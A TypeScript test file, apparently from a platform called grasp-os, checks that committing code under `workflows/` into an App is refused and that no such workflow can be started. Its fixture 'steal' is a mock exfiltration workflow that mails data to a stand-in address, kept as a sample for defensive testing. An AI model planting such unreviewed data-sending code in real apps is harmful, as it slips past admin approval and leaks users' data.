import { appErrors } from "@grasp-os/shared/apps";
import { describe, expect, it } from "vite-plus/test";
import { z } from "zod";

import { release } from "./apps.ts";
import { mockIdp } from "./idp.ts";
import { outcome, refusal, signedInApi } from "./sign-in.ts";

// An App holds no workflows of its own (GRA-1367). What it reaches is what
// its version declares: each resource in its manifest, bound and approved
// by an admin for that declaration, and each independent workflow it binds
// under an alias, whose every call is a binding of its validated
// definition, approved for that exact version. No code is read to say what
// a version calls, so nothing may run that the review doesn't list.
//
// The attacks, each refused:
// - code under `workflows/` committed into an App, which would run as the
//   App's own workflow with the App's permissions, its calls read from its
//   code rather than listed and approved: every commit refuses it, naming
//   it, and commits nothing (the chat's agent: agent-builds.test.ts; a
//   blueprint: app-no-workflows.ts holds every write that makes a version);
// - a run of such a workflow started by name: an App has none to start.

const idp = mockIdp();

/** A refusal as it reaches the client, with the paths it names. */
const refusedSchema = z.object({
  details: z.object({ issues: z.array(z.string()) }),
});

/** Code that would reach the App's mail binding outside any review. */
const stealing = {
  "workflows/steal.ts": `import { workflow, z } from "@grasp-os/sdk/workflow";

export default workflow("steal", { params: {}, input: z.unknown() }, async (step, { env }) =>
  await step.do("send", { description: "Send", sideEffect: true }, async () =>
    await env.MAIL.call("mail.send", { to: "out@example.test", subject: "Data" })
  )
);
`,
};

describe("an App's own workflows", () => {
  it("are refused on every commit, named, with nothing committed, whatever else the commit holds", async () => {
    const builder = await signedInApi(idp, "builder");
    const { id: app } = await builder.api.apps.create({ name: "Ledger" });
    await release(builder, app, { "AGENTS.md": "# Ledger\n" });

    const refused = await Promise.all([
      refusal(builder.api.apps.files.commit(app, stealing, "Steal")),
      refusal(
        builder.api.apps.files.commit(
          app,
          { "notes.md": "# Notes\n", "workflows/lib/send.ts": "export {};\n" },
          "Helper"
        )
      ),
    ]);
    const versions = await builder.api.apps.versions.list(app);

    expect({
      refused: refused.map((error) => ({
        code: appErrors.codeOf(error),
        issues: refusedSchema.parse(error).details.issues,
      })),
      versions: versions.map(({ version }) => version),
    }).toStrictEqual({
      refused: [
        { code: "app.no_workflows", issues: ["workflows/steal.ts"] },
        { code: "app.no_workflows", issues: ["workflows/lib/send.ts"] },
      ],
      versions: [1],
    });
  });

  it("can't be started by name: an App has none", async () => {
    const builder = await signedInApi(idp, "builder");
    const { id: app } = await builder.api.apps.create({ name: "Ledger" });
    await release(builder, app, { "AGENTS.md": "# Ledger\n" });

    await expect(
      outcome(builder.api.workflows.start(app, "steal"))
    ).resolves.toBe("workflow.not_found");
  });
});
